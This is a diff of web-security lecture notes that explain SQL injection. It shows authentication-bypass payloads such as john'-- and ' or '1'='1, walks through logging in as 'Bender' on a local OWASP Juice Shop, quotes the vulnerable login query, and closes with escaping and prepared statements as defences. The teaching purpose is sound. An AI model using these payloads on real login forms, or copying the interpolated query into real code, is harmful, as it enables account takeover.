-Injection attacks can be avoided by **validating** user input (e.g., is this input really an email address?) and **sanitizing** it (e.g., by stripping out potential JavaScript code elements). These steps should occur **on the server-side**, as a malicious user can always circumvent client-side validation/sanitation steps.
+:point_up: A benign user input such as `john` as username and `my_pass` as password will lead to the SQL query `select * from users where name='john' and password='my_pass'`. Once we know (or guess) how the SQL query is constructed, we can construct malicious input that allow us to retrieve the row for user `john` without knowing the correct password. For example:
+
+- The username `john'--` with any password will lead to the following SQL query `select * from users where name='john'-- and password=''`. Here, the fact that we can add comments within SQL statements is exploited to remove the requirement for the correct password.
+- The username `john` with password `anything' or '1'='1` will lead to the SQL query `select * from users where name='john' and password='anything' or '1'='1'`.
+
+#### :bangbang: Injection attack @ Juice Shop
+
+We here take up the **Login Bender** attack among all available [Juice Shop injection attacks](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part2/injection.html). The task is simple: try to login as the user `Bender` via an injection attack.
+
+1. To execute, head to your local Juice Shop installation. If you followed our suggestion of using the Docker setup, your local installation will be at [http://localhost:3000](http://localhost:3000).
+2. Head to the login screen via the Account link at the top right.
+3. If we know that `Bender` is a user, we now need to guess that user's email address. If our guess is correct, we can then see what happens if we append `'--` to the email address. If the application is susceptible to a SQL injection attack, we should be able to login with Bender's email address and any password of our choosing.
+4. With a little bit of guessing, we will end up at `bender@juice-sh.op` as the email address of user `Bender`. See if you can log in with that email address and any password of your choosing. *This should not be possible. You should receive an error message.*
+5. Now try the same email address with our little SQL injection suffix `'--`: `bender@juice-sh.op'--`. No matter the provided password, you should be able to log in as user `Bender`.
+
+Why does this work? Lets take a look at the source code of Juice Shop, in particular the [login route](https://github.com/bkimminich/juice-shop/blob/master/routes/login.js). It contains the following code snippet :point_down::
+
+```javascript
+module.exports = function login () {
+  /* ... */
+
+  return (req, res, next) => {
+    /* ... */
+    models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${insecurity.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true })
+      .then((authenticatedUser) => {
+        /* ... */
+      }).catch(error => {
+        next(error)
+      })
+  }
+}
+/* ... */
+```
+
+:point_up: As we anticipated, the user input is not validated but inserted directly into an SQL query.
+
+#### How to avoid injection attacks
+
+Injection attacks can be avoided by **validating** user input (e.g., is this input really an email address?) and **sanitizing** it (e.g., by stripping out potential JavaScript/SQL code elements). These steps should occur **on the server-side**, as a malicious user can always circumvent client-side validation/sanitation steps.
 
 A popular Node package that validates and sanitizes user input is [validator](https://www.npmjs.com/package/validator). For example, to check whether a user input constitutes a valid email address, the following two lines of code are sufficient:
 
@@ -299,9 +298,7 @@ var validator = require('validator');
 var isEmail = validator.isEmail('while(1)'); //false
 ```
 
-#### SQL injections
-
-SQL injections are of such great practical importance that we will dedicate more time to them in a later course (*CSE1505: Information and Data Management*).
+To avoid SQL injection attacks, [sqlstring](https://www.npmjs.com/package/sqlstring) is a Node.js package that escapes user provided input. Even better, instead of writing SQL queries on the fly (so-called dynamic queries as shown above), use **prepared statements** (e.g. [described here for MySQL](https://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html)) instead.
 
 
 ### Broken authentication
